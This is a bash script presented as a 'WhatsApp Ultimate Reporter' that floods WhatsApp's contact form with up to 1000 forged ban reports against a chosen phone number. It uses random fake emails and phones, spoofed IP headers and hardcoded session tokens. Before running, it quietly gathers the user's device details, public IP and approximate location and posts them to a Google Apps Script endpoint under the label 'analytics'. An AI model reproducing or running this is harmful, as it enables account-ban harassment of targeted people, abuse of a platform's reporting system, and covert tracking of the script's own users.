clear
#!/bin/bash

# WhatsApp Ultimate Reporter Pro - Enhanced Version with Device Analytics

# Initialize colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configuration
WHATSAPP_API_URL="https://www.whatsapp.com/contact/noclient/"
REPORT_URL="https://faq.whatsapp.com/3379690015658337/?helpref=uf_share"
LOG_FILE="whatsapp_ultimate.log"
PHONES_DB="phones.db"
IPS_DB="ips.db"
BAN_MSG_FILE="message_ban_whatsapp.json"
UNBAN_MSG_FILE="message_unban_whatsapp.json"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"
ANALYTICS_URL="https://script.google.com/macros/s/AKfycbwSljw2ywFLmDMkD3mXojswhWnGg0XcbcgGX1zHHbgIXivz81f_LAMttyTEmuFXxJLr0A/exec"

# Banner
clear
echo -e "${GREEN}"
echo " _    _ _   _ _   _ _____ ___  ______   __ _____ _____ _____  "
echo "| |  | | | | | \ | |_   _/ _ \|  _ \ \ / /|_   _|  ___|  ___| "
echo "| |  | | | | |  \| | | || | | | |_) \ V /   | | | |__ | |__   "
echo "| |/\| | | | | |\  | | || |_| |  _ < \ /    | | |  __||  __|  "
echo "\  /\  / |_| | | \ |_| |_\___/|_| \_\| |    |_| | |___| |___  "
echo " \/  \/ \___/|_|  \_\___/            |_|        |_|_____|_____| "
echo -e "${NC}"
echo -e "${YELLOW}WhatsApp Ultimate Reporter Pro - With Device Analytics${NC}"
echo -e "${YELLOW}====================================================${NC}"
echo -e "Created by ${WHITE}>>BayLak<<${NC} 2025/01/22"
echo

# ==================== Device Information Functions ====================
get_device_info() {
    echo -e "${CYAN}Collecting device information...${NC}"
    
    # Basic device info
    DEVICE=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
    MODEL=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
    CPU=$(getprop ro.hardware 2>/dev/null || echo "Unknown")
    RAM=$(grep "MemTotal" /proc/meminfo 2>/dev/null | awk '{print $2}' || echo "Unknown")
    SDK=$(getprop ro.build.version.sdk 2>/dev/null || echo "Unknown")
    BUILD_TIME=$(getprop ro.build.date 2>/dev/null || echo "Unknown")
    
    # Battery info
    BATTERY_STATUS=$(cat /sys/class/power_supply/battery/status 2>/dev/null || echo "Unknown")
    BATTERY_CAPACITY=$(cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo "Unknown")
    BATTERY_CURRENT=$(cat /sys/class/power_supply/battery/current_now 2>/dev/null || echo "Unknown")
    BATTERY_TYPE=$(cat /sys/class/power_supply/battery/technology 2>/dev/null || echo "Unknown")
    
    # Storage info
    STORAGE_TOTAL=$(df /data 2>/dev/null | awk 'NR==2 {print $2}' || echo "Unknown")
    STORAGE_USED=$(df /data 2>/dev/null | awk 'NR==2 {print $3}' || echo "Unknown")
    STORAGE_FREE=$(df /data 2>/dev/null | awk 'NR==2 {print $4}' || echo "Unknown")
    
    # Network info
    IP_ADDRESS=$(ip addr show wlan0 2>/dev/null | grep inet | awk '{ print $2 }' | cut -d/ -f1 || echo "Unknown")
    WIFI_STATUS=$(getprop wifi.interface 2>/dev/null || echo "Unknown")
    
    # Camera info
    CAMERA_FRONT=$(getprop ro.camera.front 2>/dev/null || echo "Unknown")
    CAMERA_BACK=$(getprop ro.camera.rear 2>/dev/null || echo "Unknown")
    
    # System info
    PROCESS_COUNT=$(ps -A 2>/dev/null | wc -l || echo "Unknown")
    CPU_INFO=$(cat /proc/cpuinfo 2>/dev/null | grep "processor" | wc -l || echo "Unknown")
    CPU_MODEL=$(cat /proc/cpuinfo 2>/dev/null | grep "model name" | head -n 1 | cut -d: -f2 | sed 's/^[ \t]*//' || echo "Unknown")
    TOTAL_MEMORY=$(free -m 2>/dev/null | grep Mem | awk '{print $2}' || echo "Unknown")
    USED_MEMORY=$(free -m 2>/dev/null | grep Mem | awk '{print $3}' || echo "Unknown")
    FREE_MEMORY=$(free -m 2>/dev/null | grep Mem | awk '{print $4}' || echo "Unknown")
    BUFFER_MEMORY=$(free -m 2>/dev/null | grep Mem | awk '{print $6}' || echo "Unknown")
    LAST_UPDATE=$(stat -c %y /system 2>/dev/null || echo "Unknown")
    
    # Internet info
    INTERNET_IP=$(curl -s ifconfig.me 2>/dev/null || echo "Unknown")
    LOCATION_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" 2>/dev/null | grep -oP '"city": "\K[^"]*' || echo "Unknown Location")
    REGION_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" 2>/dev/null | grep -oP '"region": "\K[^"]*' || echo "Unknown Region")
    COUNTRY_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" 2>/dev/null | grep -oP '"country": "\K[^"]*' || echo "Unknown Country")
    
    # Display collected info
    echo -e "${YELLOW}=== Device Information ===${NC}"
    echo -e "Device: ${WHITE}$DEVICE $MODEL${NC}"
    echo -e "CPU: ${WHITE}$CPU_MODEL ($CPU_INFO cores)${NC}"
    echo -e "RAM: ${WHITE}$(($RAM/1024)) MB${NC}"
    echo -e "Android SDK: ${WHITE}$SDK${NC}"
    echo -e "Battery: ${WHITE}$BATTERY_CAPACITY% ($BATTERY_STATUS)${NC}"
    echo -e "Location: ${WHITE}$LOCATION_INFO, $REGION_INFO, $COUNTRY_INFO${NC}"
    echo
}

send_device_analytics() {
    echo -e "${CYAN}Sending device analytics...${NC}"
    
    # URL encode all values
    DEVICE_ENC=$(echo "$DEVICE" | jq -sRr @uri 2>/dev/null || echo "$DEVICE")
    MODEL_ENC=$(echo "$MODEL" | jq -sRr @uri 2>/dev/null || echo "$MODEL")
    CPU_ENC=$(echo "$CPU" | jq -sRr @uri 2>/dev/null || echo "$CPU")
    CPU_MODEL_ENC=$(echo "$CPU_MODEL" | jq -sRr @uri 2>/dev/null || echo "$CPU_MODEL")
    BUILD_TIME_ENC=$(echo "$BUILD_TIME" | jq -sRr @uri 2>/dev/null || echo "$BUILD_TIME")
    BATTERY_STATUS_ENC=$(echo "$BATTERY_STATUS" | jq -sRr @uri 2>/dev/null || echo "$BATTERY_STATUS")
    BATTERY_TYPE_ENC=$(echo "$BATTERY_TYPE" | jq -sRr @uri 2>/dev/null || echo "$BATTERY_TYPE")
    LOCATION_INFO_ENC=$(echo "$LOCATION_INFO" | jq -sRr @uri 2>/dev/null || echo "$LOCATION_INFO")
    REGION_INFO_ENC=$(echo "$REGION_INFO" | jq -sRr @uri 2>/dev/null || echo "$REGION_INFO")
    COUNTRY_INFO_ENC=$(echo "$COUNTRY_INFO" | jq -sRr @uri 2>/dev/null || echo "$COUNTRY_INFO")
    
    # Send data to Google Sheets
    curl -s -X POST "$ANALYTICS_URL" \
        -d "deviceName=$DEVICE_ENC" \
        -d "deviceModel=$MODEL_ENC" \
        -d "cpu=$CPU_ENC" \
        -d "cpuModel=$CPU_MODEL_ENC" \
        -d "ram=$RAM" \
        -d "sdk=$SDK" \
        -d "buildTime=$BUILD_TIME_ENC" \
        -d "batteryStatus=$BATTERY_STATUS_ENC" \
        -d "batteryCapacity=$BATTERY_CAPACITY" \
        -d "batteryCurrent=$BATTERY_CURRENT" \
        -d "batteryType=$BATTERY_TYPE_ENC" \
        -d "storageTotal=$STORAGE_TOTAL" \
        -d "storageUsed=$STORAGE_USED" \
        -d "storageFree=$STORAGE_FREE" \
        -d "ipAddress=$IP_ADDRESS" \
        -d "wifiStatus=$WIFI_STATUS" \
        -d "frontCamera=$CAMERA_FRONT" \
        -d "backCamera=$CAMERA_BACK" \
        -d "processCount=$PROCESS_COUNT" \
        -d "cpuInfo=$CPU_INFO" \
        -d "totalMemory=$TOTAL_MEMORY" \
        -d "usedMemory=$USED_MEMORY" \
        -d "freeMemory=$FREE_MEMORY" \
        -d "bufferMemory=$BUFFER_MEMORY" \
        -d "lastUpdate=$LAST_UPDATE" \
        -d "internetIp=$INTERNET_IP" \
        -d "locationInfo=$LOCATION_INFO_ENC" \
        -d "regionInfo=$REGION_INFO_ENC" \
        -d "countryInfo=$COUNTRY_INFO_ENC" > /dev/null
    
    echo -e "${GREEN}Device analytics sent successfully!${NC}"
}

# ==================== Core Functions ====================
check_dependencies() {
    local missing=()
    for cmd in curl jq shuf; do
        if ! command -v $cmd &> /dev/null; then
            missing+=("$cmd")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}Missing dependencies:${NC} ${missing[*]}"
        echo "On Ubuntu/Debian, run: sudo apt-get install ${missing[*]}"
        exit 1
    fi
}

check_files() {
    for file in "$PHONES_DB" "$IPS_DB" "$BAN_MSG_FILE" "$UNBAN_MSG_FILE"; do
        if [ ! -f "$file" ]; then
            echo -e "${RED}Error: $file file not found!${NC}"
            exit 1
        fi
    done
}

validate_phone() {
    local phone=$1
    if [[ $phone =~ ^\+[0-9]{1,4}[0-9]{10,12}$ ]]; then
        return 0
    else
        return 1
    fi
}

generate_random_email() {
    local length=10
    local chars=abcdefghijklmnopqrstuvwxyz0123456789
    local random_name=""
    for (( i=0; i<length; i++ )); do
        random_name+=${chars:$(( RANDOM % ${#chars} )):1}
    done
    echo "${random_name}@gmail.com"
}

generate_random_phone() {
    local country=$1
    case $country in
        "ID") echo "+62"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "EG") echo "+20"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "US") echo "+1"$(printf "%09d" $(( RANDOM % 1000000000 ))) ;;
        "KR") echo "+82"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "CN") echo "+86"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "IN") echo "+91"$(printf "%09d" $(( RANDOM % 1000000000 ))) ;;
        *) echo "0"$(printf "%09d" $(( RANDOM % 1000000000 ))) ;;
    esac
}

get_random_line() {
    local file=$1
    shuf -n 1 "$file"
}

urlencode() {
    local string="${1}"
    local length=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<length ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9]) o="${c}" ;;
            *) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}

send_api_request() {
    local post_data=$1
    local random_ip=$2
    
    local headers=(
        "Host: www.whatsapp.com"
        "Cookie: wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz"
        "Sec-Ch-Ua-Platform: \"Linux\""
        "Accept-Language: en-US,en;q=0.9"
        "Sec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""
        "Sec-Ch-Ua-Mobile: ?0"
        "X-Asbd-Id: 129477"
        "X-Fb-Lsd: AVpbkNjZYpw"
        "User-Agent: $USER_AGENT"
        "Content-Type: application/x-www-form-urlencoded"
        "Accept: */*"
        "Origin: https://www.whatsapp.com"
        "Sec-Fetch-Site: same-origin"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://www.whatsapp.com/contact/noclient?"
        "Accept-Encoding: gzip, deflate, br"
        "X-Forwarded-For: $random_ip"
        "Client-IP: $random_ip"
    )
    
    curl -s -X POST "$WHATSAPP_API_URL" \
        -H "${headers[0]}" -H "${headers[1]}" -H "${headers[2]}" -H "${headers[3]}" \
        -H "${headers[4]}" -H "${headers[5]}" -H "${headers[6]}" -H "${headers[7]}" \
        -H "${headers[8]}" -H "${headers[9]}" -H "${headers[10]}" -H "${headers[11]}" \
        -H "${headers[12]}" -H "${headers[13]}" -H "${headers[14]}" -H "${headers[15]}" \
        -H "${headers[16]}" -H "${headers[17]}" -H "${headers[18]}" \
        --data-raw "$post_data" \
        -w "\n%{http_code}"
}

send_report_url() {
    local phone_number=$1
    local report_url="${REPORT_URL}&phone=${phone_number}"
    
    echo -e "${YELLOW}Sending ultimate report URL:${NC} ${report_url}"
    
    # Try to open in default browser
    if command -v xdg-open &> /dev/null; then
        xdg-open "$report_url" 2>/dev/null
    elif command -v open &> /dev/null; then
        open "$report_url" 2>/dev/null
    fi
    
    echo "Report URL sent: $report_url" >> "$LOG_FILE"
}

perform_attack() {
    local num_requests=$1
    local delay=$2
    local target_number=$3
    local action=$4
    
    # Load appropriate message file
    local messages_file="$BAN_MSG_FILE"
    if [ "$action" == "unban" ]; then
        messages_file="$UNBAN_MSG_FILE"
    fi
    
    # Parse JSON file
    local messages=()
    while IFS= read -r line; do
        messages+=("$line")
    done < <(jq -c '.[]' "$messages_file")
    
    if [ ${#messages[@]} -eq 0 ]; then
        echo -e "${RED}No messages found in $messages_file${NC}"
        return 1
    fi
    
    # Countries list with emphasis on Indonesia
    local countries=("ID" "ID" "ID" "EG" "US" "KR" "CN" "IN")
    local platforms=("ANDROID" "IPHONE" "WHATS_APP_WEB_DESKTOP" "KAIOS" "OTHER")
    
    for ((i=1; i<=num_requests; i++)); do
        # Get random values
        local random_phone=$(get_random_line "$PHONES_DB")
        local random_ip=$(get_random_line "$IPS_DB")
        local random_message=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.message' | sed "s/\[###\]/$target_number/g")
        local random_subject=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.subject')
        local country_selector=${countries[$(( RANDOM % ${#countries[@]} ))]}
        local platform=${platforms[$(( RANDOM % ${#platforms[@]} ))]}
        local email=$(generate_random_email)
        local phone_number=$(generate_random_phone "$country_selector")
        local jazoest="20000$(( RANDOM % 90000 + 10000 ))"
        local __hsi=$(( RANDOM % 999999999999999999 + 1000000000000000000 ))
        local __req=$(awk -v min=0.1 -v max=10 'BEGIN{srand(); printf "%.6f\n", min+rand()*(max-min)}')
        local __a=$(( RANDOM % 1000000000 + 1 ))
        local __rev=$(( RANDOM % 9000000000 + 1000000000 ))
        
        # Prepare data
        local post_data="country_selector=${country_selector}&email=$(urlencode "$email")&email_confirm=$(urlencode "$email")&phone_number=$(urlencode "$phone_number")&platform=${platform}&your_message=$(urlencode "${random_subject}%A0${random_message}")&step=articles&__user=0&__a=${__a}&__req=${__req}&__hs=20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0&dpr=1&__ccg=UNKNOWN&__rev=${__rev}&__s=ugvlz3%3A6skj2s%3A4yux6k&__hsi=${__hsi}&__dyn=7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu&__csr=&lsd=AVpbkNjZYpw&jazoest=${jazoest}"
        
        # Send request
        local response=$(send_api_request "$post_data" "$random_ip")
        local http_code=$(echo "$response" | tail -n1)
        local response_body=$(echo "$response" | head -n -1)
        
        # Log response
        echo -e "Request: $i\nIP: $random_ip\nPhone: $random_phone\nData: $post_data\nResponse: $response_body\nHTTP Code: $http_code\n" >> "$LOG_FILE"
        
        # Display result
        if [ "$http_code" -eq 200 ]; then
            echo -e "${RED}request:${GREEN}($i) ${RED}device?:${GREEN}${random_phone} ${RED}IP:${GREEN}${random_ip} ${BLUE}-> ${WHITE}Email:${email} | Phone:${country_selector} ${phone_number} | Target -> ${target_number}"
        else
            echo -e "${RED}${random_ip} $i - Request failed with status code: ${http_code}${NC}"
        fi
        
        # Send ultimate report URL every 5 requests
        if (( i % 5 == 0 )); then
            send_report_url "$target_number"
        fi
        
        # Delay between requests
        if [ $i -lt $num_requests ]; then
            sleep $delay
        fi
    done
    
    # Final report URL send
    send_report_url "$target_number"
}

# Main function
main() {
    # First collect and send device information
    get_device_info
    send_device_analytics
    
    # Then proceed with the main functionality
    check_dependencies
    check_files
    
    # Get target phone number
    while true; do
        echo -e "${CYAN}Enter the target phone number with country code (e.g. +628123456789): ${NC}"
        read -r target_number
        
        if validate_phone "$target_number"; then
            echo -e "${GREEN}Valid target number: ${target_number}${NC}"
            break
        else
            echo -e "${RED}Invalid format. Example: +628123456789 (Indonesia)${NC}"
        fi
    done
    
    # Get action type
    while true; do
        echo -e "${CYAN}Select action type (ban/unban): ${NC}"
        read -r action
        
        if [[ "$action" == "ban" || "$action" == "unban" ]]; then
            echo -e "${GREEN}Action confirmed: ${action}${NC}"
            break
        else
            echo -e "${RED}Invalid choice. Please enter 'ban' or 'unban'.${NC}"
        fi
    done
    
    # Get number of requests
    while true; do
        echo -e "${CYAN}Enter number of attack requests (1-1000): ${NC}"
        read -r num_requests
        
        if [[ "$num_requests" =~ ^[0-9]+$ && "$num_requests" -gt 0 && "$num_requests" -le 1000 ]]; then
            break
        else
            echo -e "${RED}Please enter a number between 1-1000.${NC}"
        fi
    done
    
    # Get delay between requests
    while true; do
        echo -e "${CYAN}Enter delay between requests in seconds (1-60): ${NC}"
        read -r delay
        
        if [[ "$delay" =~ ^[0-9]+$ && "$delay" -ge 1 && "$delay" -le 60 ]]; then
            break
        else
            echo -e "${RED}Please enter a number between 1-60.${NC}"
        fi
    done
    
    # Confirm action
    echo -e "${YELLOW}Preparing to launch attack:${NC}"
    echo -e "Target: ${WHITE}${target_number}${NC}"
    echo -e "Action: ${WHITE}${action}${NC}"
    echo -e "Requests: ${WHITE}${num_requests}${NC}"
    echo -e "Delay: ${WHITE}${delay} seconds${NC}"
    
    echo -e "\n${RED}WARNING: This will send actual requests to WhatsApp servers. Use responsibly.${NC}"
    read -p "Are you sure you want to proceed? (y/n): " -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}Starting attack...${NC}"
        perform_attack "$num_requests" "$delay" "$target_number" "$action"
        echo -e "${GREEN}Attack completed. Check ${LOG_FILE} for details.${NC}"
    else
        echo -e "${YELLOW}Operation cancelled.${NC}"
    fi
}

# Run main function
main
